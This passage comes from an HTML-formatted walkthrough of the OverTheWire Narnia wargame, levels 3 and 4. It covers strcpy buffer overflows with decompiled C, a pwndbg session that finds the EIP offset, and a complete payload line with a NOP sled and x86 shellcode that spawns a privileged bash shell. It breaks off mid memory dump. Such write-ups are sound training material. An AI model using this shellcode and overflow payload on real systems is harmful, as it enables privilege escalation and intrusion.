</span><span class="c8">2</span><span class="c3">){<br> &nbsp; &nbsp; &nbsp; &nbsp;printf(</span><span class="c11">&quot;usage, %s file, will send contents of file 2 /dev/null\n&quot;</span><span class="c3">,argv[</span><span class="c8">0</span><span class="c3">]);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">exit</span><span class="c3">(-</span><span class="c8">1</span><span class="c3">);<br> &nbsp; &nbsp;}<br><br> &nbsp; &nbsp;</span><span class="c12">/* open files */</span><span class="c3"><br> &nbsp; &nbsp;strcpy(ifile, argv[</span><span class="c8">1</span><span class="c3">]);<br> &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">((ofd = open(ofile,O_RDWR)) &lt; </span><span class="c8">0</span><span class="c3">&nbsp;){<br> &nbsp; &nbsp; &nbsp; &nbsp;printf(</span><span class="c11">&quot;error opening %s\n&quot;</span><span class="c3">, ofile);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">exit</span><span class="c3">(-</span><span class="c8">1</span><span class="c3">);<br> &nbsp; &nbsp;}<br> &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">((ifd = open(ifile, O_RDONLY)) &lt; </span><span class="c8">0</span><span class="c3">&nbsp;){ <br> &nbsp; &nbsp; &nbsp; &nbsp;printf(</span><span class="c11">&quot;error opening %s\n&quot;</span><span class="c3">, ifile);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">exit</span><span class="c3">(-</span><span class="c8">1</span><span class="c3">);<br> &nbsp; &nbsp;}<br><br> &nbsp; &nbsp;</span><span class="c12">/* copy from file1 to file2 */</span><span class="c3"><br> &nbsp; &nbsp;read(ifd, buf, sizeof(buf)-</span><span class="c8">1</span><span class="c3">);<br> &nbsp; &nbsp;write(ofd,buf, sizeof(buf)-</span><span class="c8">1</span><span class="c3">);<br> &nbsp; &nbsp;printf(</span><span class="c11">&quot;copied contents of %s to a safer place... (%s)\n&quot;</span><span class="c3">,ifile,ofile);<br><br> &nbsp; &nbsp;</span><span class="c12">/* close &#39;em */</span><span class="c3"><br> &nbsp; &nbsp;close(ifd);<br> &nbsp; &nbsp;close(ofd);<br><br> &nbsp; &nbsp;</span><span class="c6">exit</span><span class="c3">(</span><span class="c8">1</span><span class="c3">);<br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>We can see from the source code that the program is not checking for the size of the user input before running the strcpy function. The usage of the strcpy function should be avoided as it can result in a buffer overflow vulnerability. &nbsp;By inputting over 32 bytes to the </span><span class="c3">ifile</span><span>, the </span><span class="c3">ofile</span><span class="c2">&nbsp;variable (initialized to /dev/null) was overwritten.</span></p><h2 class="c10" id="h.125dslwuwfyp"><span class="c40 c36">Narnia 4</span></h2><p class="c0"><span class="c2">As the narnia4 user, we can now running the narnia4 binary. However, when executing the binary, nothing happens:</span></p><a id="t.e25f82eff16ac71a8dacf4b2949dc7a3179cd869"></a><a id="t.43"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia4</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3 c45">./narnia4 </span></p><p class="c19"><span class="c3">narnia4</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$</span></p></td></tr></table><h3 class="c10" id="h.yp19zv417s7"><span class="c5">Binary Analysis</span></h3><p class="c0"><span class="c2">Downloading this binary and opening it up on Ghidra shows the following code:</span></p><a id="t.a6ba69d453e9930a8e4fb156ce19deb444b4940e"></a><a id="t.44"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">undefined4 </span><span class="c4">main</span><span class="c8">(</span><span class="c6">int</span><span class="c8">&nbsp;param_1,</span><span class="c6">int</span><span class="c8">&nbsp;param_2)</span><span class="c3"><br><br>{<br> &nbsp;</span><span class="c6">size_t</span><span class="c3">&nbsp;__n;<br> &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;local_108 [</span><span class="c8">256</span><span class="c3">];<br> &nbsp;</span><span class="c6">int</span><span class="c3">&nbsp;local_8;<br> &nbsp;<br> &nbsp;local_8 = </span><span class="c8">0</span><span class="c3">;<br> &nbsp;</span><span class="c6">while</span><span class="c3">&nbsp;(*(</span><span class="c6">int</span><span class="c3">&nbsp;*)(environ + local_8 * </span><span class="c8">4</span><span class="c3">) != </span><span class="c8">0</span><span class="c3">) {<br> &nbsp; &nbsp;__n = </span><span class="c8">strlen</span><span class="c3">(*(</span><span class="c6">char</span><span class="c3">&nbsp;**)(environ + local_8 * </span><span class="c8">4</span><span class="c3">));<br> &nbsp; &nbsp;</span><span class="c8">memset</span><span class="c3">(*(</span><span class="c6">void</span><span class="c3">&nbsp;**)(environ + local_8 * </span><span class="c8">4</span><span class="c3">),</span><span class="c8">0</span><span class="c3">,__n);<br> &nbsp; &nbsp;local_8 = local_8 + </span><span class="c8">1</span><span class="c3">;<br> &nbsp;}<br> &nbsp;</span><span class="c6">if</span><span class="c3">&nbsp;(</span><span class="c8">1</span><span class="c3">&nbsp;&lt; param_1) {<br> &nbsp; &nbsp;</span><span class="c8">strcpy</span><span class="c3">(local_108,*(</span><span class="c6">char</span><span class="c3">&nbsp;**)(param_2 + </span><span class="c8">4</span><span class="c3">));<br> &nbsp;}<br> &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>The program is allocating 256 bytes to some variable and performing some innocuous operation on it inside the while loop. After doing so, the program runs an if statement which uses the dangerous strcpy function (see </span><span class="c38"><a class="c14" href="#h.ya2tytmk5a6">Narnia 3</a></span><span class="c2">). </span></p><h3 class="c10" id="h.cupgylaegp6p"><span>Binary Exploitation</span></h3><p class="c0"><span class="c2">We can attempt to overflow the buffer by sending a large number of bytes in a pattern using pwndbg to determine where the eip offset is:</span></p><a id="t.b2bb4e5f2ccd3c99eb79c19211ea94eb642e2e08"></a><a id="t.45"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; r $(cyclic </span><span class="c8">500</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting </span><span class="c11">program:</span><span class="c3">&nbsp;</span><span class="c12">/home/</span><span class="c8">0xd4</span><span class="c3">y</span><span class="c12">/business/</span><span class="c3">other</span><span class="c12">/overthewire/</span><span class="c3">narnia</span><span class="c12">/4/</span><span class="c3">narnia4 $(cyclic </span><span class="c8">500</span><span class="c3">)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Program received signal SIGSEGV, Segmentation fault. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0x63616171</span><span class="c3">&nbsp;</span><span class="c6">in</span><span class="c3">&nbsp;?? () &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br><br>pwndbg&gt; cyclic -l 0x63616171 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>264 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Therefore, we can input a maximum of 264 bytes before overwriting the eip register. Thus, we can do just as we did in </span><span class="c38"><a class="c14" href="#h.e4mp3rcoeyar">Narnia 2</a></span><span>, and create a payload that will fill overwrite the eip register with an address that points to shellcode</span><sup><a href="#ftnt9" id="ftnt_ref9">[9]</a></sup><span class="c2">:</span></p><a id="t.fd442346faddb535315d02640126308a906d3140"></a><a id="t.46"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; r $(python -c </span><span class="c11">&quot;print &#39;A&#39;*264+&#39;B&#39;*4+&#39;\x90&#39;*100+&#39;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#39;&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Starting program: /home/</span><span class="c8">0</span><span class="c3">xd4y/business/other/overthewire/narnia/</span><span class="c8">4</span><span class="c3">/narnia4 $(python -c </span><span class="c11">&quot;print &#39;A&#39;*264+&#39;B&#39;*4+&#39;\x90&#39;*100+&#39;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x</span><span class="c3"><br></span><span class="c8">68</span><span class="c3">\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#39;&quot;) &nbsp; &nbsp; <br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Program received signal SIGSEGV, Segmentation fault. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0x</span><span class="c8">42424242</span><span class="c3">&nbsp;in ?? () &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>pwndbg&gt; x/100x $esp-200 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffcdf8: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce08: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce18: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce28: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce38: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce48: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce58: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce68: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce78: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce88: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffce98: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffcea8: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffceb8: &nbsp; &nbsp; 0x</span><span class="c8">41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">42424242</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffcec8: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffced8: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffcee8: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffcef8: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffcf08: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffcf18: &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">90909090</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x</span><span class="c8">9958</span><span class="c3">0b6a &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffcf28: &nbsp; &nbsp; 0x2d</span><span class="c8">686652</span><span class="c3">&nbsp; &nbsp; &nbsp; 0x52e</span><span class="c8">1897</span><span class="c3">0 &nbsp; &nbsp; &nbsp;0x2f</span><span class="c8">6868</span><span class="c3">6a &nbsp; &nbsp; &nbsp;0x</span><span class="c8">68736162</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffcf38: &nbsp; &nbsp; 0x6e</span><span class="c8">6962</span><span class="c3">2f &nbsp; &nbsp; &nbsp;0x</span><span 